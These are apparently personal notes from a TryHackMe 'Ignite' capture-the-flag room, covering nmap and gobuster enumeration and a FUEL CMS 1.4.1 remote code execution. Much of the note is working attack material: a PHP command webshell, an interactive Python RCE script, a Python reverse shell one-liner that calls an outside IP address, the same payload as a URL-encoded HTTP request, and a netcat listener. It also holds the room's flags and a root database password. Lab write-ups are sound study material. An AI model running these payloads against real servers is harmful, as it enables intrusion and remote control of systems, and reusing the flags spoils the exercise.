---
cssclasses:
  - jbm-note
Date: 2026-06-17
tags:
  - THMChallenge
---
# **CVE** Challenge

| **Target** :LiTarget:            | *Try hack me machine(room:ignite)*     |
| -------------------------------- | -------------------------------------- |
| Date :LiCalendar:                | 17/06/2026                             |
| Main attack type                 | FUEL CMS RCE                           |
| Secondary attack type            | ...                                    |
| Tools :LiToolCase:               | NMAP, GOBUSTER, BurpSuite, Python      |
| Criticality :RiAlarmWarningLine: | CVE-20..-... **9**, **Critical** - RCE |

---
# **RESULTS**
---
## Flags/Tasks
### Task 1
1. User.txt?
	- *6470e394cbf6dab6a91682cc8585059b *
2. Root.txt?
	- *b9bbcb33e11b80be759c4e844862482d*

---
# Preparation
---
## Resources
- Resources / Information provided in-room
## PHP PAYLOAD
```php
<?php if(isset($_GET('cmd'))) { $cmd = $_GET('cmd'); echo (system($cmd)); } ?>
```
## Python Reverse shell (CMS 1.4.1 - RCE)
```python
url = "http://TARGET"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	#proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url)
```
#### **Fixed**:
```python
import urllib.parse
import requests

url = "http://10.48.153.212"

def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
    try:
        xxxx = input('cmd:')
        encoded_cmd = urllib.parse.quote(xxxx)
        burp0_url = f"{url}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{encoded_cmd}%27%29%2b%27"
        r = requests.get(burp0_url)
        print(r.text)  # Added to print the server response
        
    except KeyboardInterrupt:
        print("\nExiting...")
        break
```

## Python sudo shell payload
```shell
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.154.246\",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
```
**BurpSuite**/Manual:
```http
GET /fuel/pages/select/?filter='%2bpi(print(%24a%3d'system'))%2b%24a('python%20-c%20%22import%20socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%5c%22192.168.154.246%5c%22%2c7777))%3bos.dup2(s.fileno()%2c0)%3bos.dup2(s.fileno()%2c1)%3bos.dup2(s.fileno()%2c2)%3bp%3dsubprocess.call(%5b%5c%22%2fbin%2fsh%5c%22%2c%5c%22-i%5c%22%5d)%3b%22')%2b'
 HTTP/1.1
```
```bash
nc -lvnp 7777
```
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
---
# Initial investigation/enumeration
---
## **Enumeration**
### NMAP
#### Simple scan
```bash
sudo nmap -sS -sV -O TARGET
```
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```
#### ALL Ports
```bash
sudo nmap -sS -p- TARGET
```
```

```
### GOBUSTER
#### Basic
```bash
gobuster dir -u http://10.48.153.212 -w /usr/share/wordlists/dirb/common.txt
```
```
.hta                 (Status: 403) [Size: 292]
.htaccess            (Status: 403) [Size: 297]
.htpasswd            (Status: 403) [Size: 297]
@                    (Status: 400) [Size: 1134]
0                    (Status: 200) [Size: 16597]
assets               (Status: 301) [Size: 315] [--> http://TARGET/assets/]
home                 (Status: 200) [Size: 16597]
index                (Status: 200) [Size: 16597]
index.php            (Status: 200) [Size: 16597]
lost+found           (Status: 400) [Size: 1134]
offline              (Status: 200) [Size: 70]
robots.txt           (Status: 200) [Size: 30]
server-status        (Status: 403) [Size: 301]
```
#### fuel endpoint
```bash
```
## **Vulnerability scanning**
### SQLI

---
# Exploiting and Investigation
---
## Enumerating the server
![[INSA notes/Challenges/External/Try hack me/TRYHACKME-CHALLENGE-2026-6-17/Images/TARGET_PAGE_PORT_80.png]]
When running `nmap` on the server, a webserver on port 80 was discovered. Further enumeration by visiting the server reveals the credentials to a login page plainly.

User name: **admin**
Password: **admin**
![[INSA notes/Challenges/External/Try hack me/TRYHACKME-CHALLENGE-2026-6-17/Images/TARGET_PAGE_LOGIN.png]]
Although it states that the server uses **MySQL**, it is not important since it is not vulnerable to SQLi and there is only one user(*admin*).

## Exploring the admin panel
![[INSA notes/Challenges/External/Try hack me/TRYHACKME-CHALLENGE-2026-6-17/Images/TARGET_PAGE_ADMIN.png]]
The admin panel does not show any particularly important vulnerabilities since Fuel CMS has other exploitable vulnerabilities of its own.

## Rooting the machine
### Initial access
Researching vulnerabilities for *Fuel CMS* leads to an RCE payload which can be used to setup a reverse shell. Running `whoami` returns the user `www-data`, a `flag.txt` file is located in the user's directory which contains the user flag.

### Privilege escalation
Instead of running a privilege escalation command, root access can be gained by finding the root credentials found in the database config file (`/application/config/database.php`) mentioned in the main page.
```php
$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
);
```
%% 
## Other findings:
### Robots.txt
```
User-agent: *
Disallow: /fuel/
```
**`/fuel/`** redirects to the login page.
 %%